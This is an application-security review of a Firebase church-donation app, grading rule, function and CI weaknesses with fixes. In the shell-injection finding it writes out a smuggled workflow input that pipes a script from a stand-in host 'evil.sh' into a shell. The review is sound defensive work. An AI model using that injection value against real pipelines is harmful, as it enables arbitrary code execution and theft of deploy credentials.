# Security Engineer (AppSec) — Critique

**Discipline grade: CRITICAL**

Reviewed: `firestore.rules`, `storage.rules`, `functions/src/index.ts`, `lib/main.dart`, `README.md`, CI workflows.

This is a multi-tenant application that records money donated to churches. The threat model that matters is *tenant A reading or corrupting tenant B*, and *a member escalating past their role*. The rules file is the entire enforcement layer for the client SDK, and it is doing considerably less work than it appears to.

---

## CRITICAL — A suspended church can un-suspend itself

`firestore.rules:60`

```
match /churches/{churchId} {
  allow write: if belongsToChurch(churchId) && isPastorOrAdmin();
```

This is an unrestricted document write. The `churches/{id}` document also holds `isActive`, which is the flag your entire suspension feature keys off — `README.md` describes it as the platform operator's control for shutting down a tenant, and `setChurchActive` (`functions/src/index.ts:411`) is a platform-admin-only callable that writes it.

A church pastor can bypass that callable entirely with three lines of client SDK and set `isActive: true` on their own document. The same write also lets them forge `churchSetupCompletedAt`, rewrite branding, and set any field a future feature adds to that document.

**Fix:** enumerate the writable fields. Deny `isActive` (and any other platform-owned field) from client writes; it should only ever move through `setChurchActive`.

```
allow update: if belongsToChurch(churchId) && isPastorOrAdmin()
  && !request.resource.data.diff(resource.data).affectedKeys()
       .hasAny(['isActive', 'churchSetupCompletedAt', 'createdAt']);
```

## CRITICAL — The audit log is written by the client it audits

`firestore.rules:139` allows `create` on `activity_logs` to **any** authenticated church member, and `lib/features/activity/activity_log_helper.dart:20-31` shows the client supplying `actorUid`, `actorSnapshot.role`, `action`, and `entitySnapshot` as plain data.

Every value in your audit trail is attacker-controlled. A staff member can write a log entry claiming the pastor approved something, or — more usefully for them — simply *not* write the log for their own action, since logging is a client-side call that fails silently (`if (user == null || profile == null) return;`).

An audit log that the audited party can forge and skip is worse than no audit log, because it will be believed.

**Fix:** move activity logging server-side. Either write it from the Firestore triggers that already fire on entry/partner changes, or expose a single callable that stamps `actorUid` from `request.auth.uid`. Then set `allow create: if false` in rules.

## CRITICAL — Entry rules do not validate the money

`firestore.rules:80` — pastors may create entries with no field constraints whatsoever. The comment in the file is candid about it:

> Field-level review checks are enforced in app code, not rules

App code is not an enforcement layer. It is a suggestion that runs on a device the attacker owns. A pastor can write an entry with `amountCedis: 999999999`, a `churchId` pointing at another tenant, a `createdAt` in 2099, or `partnerId` referencing a partner that does not exist — and `applyApprovalDeltas` (`functions/src/index.ts:663`) will faithfully add it to the church totals.

The staff path (`firestore.rules:84`) is better — it pins `status`, `reviewedBy`, `reviewedAt` — but still never checks that `amountCedis` is a positive number, that `createdBy == request.auth.uid`, or that `churchId` matches the path.

**Fix:** type-and-range validate in rules. `request.resource.data.amountCedis is number && request.resource.data.amountCedis > 0`, `request.resource.data.createdBy == request.auth.uid`, `request.resource.data.churchId == churchId`. The stated reason for skipping this (`serverTimestamp()` not matchable) applies only to the timestamp fields, not to the amount.

## CRITICAL — App Check is theater

`lib/main.dart:17-22` activates App Check on Android and iOS. The README lists App Check under the deploy checklist as though it were a control.

Not one callable enforces it. Grepping `functions/src/index.ts` for `enforceAppCheck` returns nothing; every `onCall` is declared as `onCall({region: REGION}, ...)`. Firestore App Check enforcement is also absent from any config in the repo. And `main.dart:17` explicitly skips App Check on web — which is your *deployed* platform, per `firebase.json`'s hosting block.

So: the one platform actually serving users has no App Check at all, and the platforms that do register a token are talking to a backend that ignores it. You are paying the integration cost of App Check and receiving none of the protection.

**Fix:** `onCall({region: REGION, enforceAppCheck: true}, ...)` on every callable; add `ReCaptchaV3Provider` for web; turn on App Check enforcement for Firestore and Storage in the console once clients are rolled out.

## HIGH — Invite codes are generated with `Math.random()`

`functions/src/index.ts:41` and `:51`

```js
s += chars[Math.floor(Math.random() * chars.length)];
```

`Math.random()` is not a CSPRNG. In V8 it is xorshift128+ with a 128-bit state that is recoverable from a modest number of consecutive outputs. These codes are the sole credential for joining a church (8 chars) or **creating a brand-new tenant** (10 chars). An attacker who can harvest codes — trivially, by requesting several invites to addresses they control — can work toward predicting codes issued to other people.

**Fix:** `crypto.randomBytes()` with rejection sampling over your alphabet. It is a four-line change.

## HIGH — Unauthenticated invite-validation oracle, no rate limiting

`validateBootstrapInvite` (`:179`) and `validateInviteCode` (`:432`) never check `request.auth`. Anyone on the internet can call them with arbitrary `{email, code}` pairs at whatever rate Cloud Functions will scale to.

That gives an attacker:

- **A brute-force oracle.** 32^8 is large, but there is no lockout, no attempt counter, and no delay. Combined with the `Math.random()` weakness above, the search space is not what the character count suggests.
- **An account-existence oracle.** `validateInviteCode` returns `"Invite not found for this email and code."` versus `"This invite is no longer valid."` — different strings for *no such invite* and *invite exists but is accepted/expired*. That leaks which email addresses have been invited to which churches. `validateInviteCode` even returns `churchName` and `churchId` on success.
- **A billing amplifier.** Each call is a `collectionGroup` query across every tenant. Unauthenticated, unmetered, and billed to you.

**Fix:** per-IP and per-email rate limiting (App Check enforcement gets you most of the way), constant error messages for all failure modes, and an attempt counter on the invite document that expires the code after N misses.

## HIGH — A live service account key is sitting in the repository root

`thepillr2-firebase-adminsdk-fbsvc-1d5000c483.json`

Credit where due: `.gitignore:2` covers `*-firebase-adminsdk-*.json`, and `git log --all` confirms it was never committed. That is the difference between this being HIGH and being a disclosure event.

It is still an unencrypted, non-expiring, project-wide admin credential living in a directory you routinely tar, sync, back up, share, and point AI tooling at. `README.md` and `docs/BACKUP.md` both instruct the reader to keep such a file around and export `GOOGLE_APPLICATION_CREDENTIALS` at it.

**Fix:** delete the file, revoke the key in the console, and use `gcloud auth application-default login` (option B, already documented) as the *only* documented path. If a key is unavoidable for CI, use Workload Identity Federation — `.github/workflows/deploy-firebase.yml` already links to it in a comment and then doesn't use it.

## HIGH — `FIREBASE_TOKEN` for CI deploys

`.github/workflows/deploy-firebase.yml:44` and `app-distribution.yml:31` authenticate with a `firebase login:ci` token. That token is a long-lived refresh token for a **human user account**, carrying that human's full project permissions, with no scoping and no expiry. Firebase has deprecated this path. Anyone with repo write access, or any compromised action in the workflow, exfiltrates full project ownership.

**Fix:** Workload Identity Federation with a deploy-scoped service account.

## MODERATE — Shell injection in the deploy workflow

`.github/workflows/deploy-firebase.yml:44`

```yaml
run: npx -y firebase-tools@latest deploy --only "${{ github.event.inputs.only }}" ...
```

`workflow_dispatch` input interpolated directly into a `run:` block. A user with Actions-trigger permission can supply `firestore"; curl evil.sh | sh; echo "` and execute arbitrary code in a runner that holds `FIREBASE_TOKEN`.

The blast radius is limited to people who can already trigger workflows — which is why this is MODERATE and not HIGH — but it converts "can trigger a deploy" into "can steal the deploy credential," and those are meaningfully different permissions.

**Fix:** pass it through `env:` and reference `"$ONLY"` inside the script.

## MODERATE — HTML injection in invite emails

`functions/src/index.ts:114-131`. `churchName`, `inviterName`, and `role` are interpolated raw into an HTML email body. `churchName` originates from user input at `redeemBootstrapInvite`, and `inviterName` from a Firebase Auth `displayName` the user sets themselves.

Email clients strip `<script>`, so this is not stored XSS. It is still enough to inject arbitrary markup and links into an email sent from your verified domain — a clean phishing primitive with your branding and SPF alignment attached.

**Fix:** HTML-escape every interpolated value.

## MODERATE — Role checks cost a document read and can be raced

Every rule evaluation calls `getUserData()` → `get(/user_church_index/$(uid))`. Beyond the cost (see the DBA critique), this means authorization state lives in a mutable document rather than in the token. When `updateChurchMember` demotes someone, existing clients keep working against the old value until the next read, and there is no way to force revocation.

**Fix:** Firebase Auth custom claims for `churchId` and `role`, set by `completeRegistration` / `updateChurchMember`. Rules read `request.auth.token.role` — free, atomic, and revocable by forcing a token refresh.

## MINOR — Storage rules give staff access to period report PDFs

`storage.rules:16` allows any authenticated church member to read `churches/{id}/period_reports/{file}`. These are full financial summaries for a period. Firestore rules restrict `goals` to pastors only (`firestore.rules:130`) — so the PDF is a strictly weaker door onto the same numbers. Decide which is right and make them agree.

## NOTHING — These looked wrong and are fine

- **`user_church_index` writes** are denied to all clients (`firestore.rules:44`) and only written by Admin SDK. Correct.
- **`church_bootstrap_invites` and `platform_audit_logs`** are `read, write: if false`. Correct — server-only collections.
- **`firebase_options.dart` API keys** in source control. Firebase web API keys are public identifiers, not secrets. Not a finding.
- **`invite_codes` `allow update: if false`** — status transitions go through functions only. Correct.
- **`completeRegistration` email binding** (`:491`) verifies the signed-in email matches the invite before granting membership. Correct, and the most carefully written authorization check in the file.

---

## Priority order

1. Field-restrict `churches/{churchId}` writes — stops tenant self-un-suspension.
2. Move activity logging server-side.
3. Validate `amountCedis` / `createdBy` / `churchId` in rules.
4. Enforce App Check on all callables; add web provider.
5. Replace `Math.random()` with `crypto.randomBytes()`.
6. Rate-limit and de-oracle the two unauthenticated callables.
7. Revoke and delete the service account key; move CI to Workload Identity.
8. Escape HTML in emails; fix the workflow-input injection.
9. Migrate role checks to custom claims.
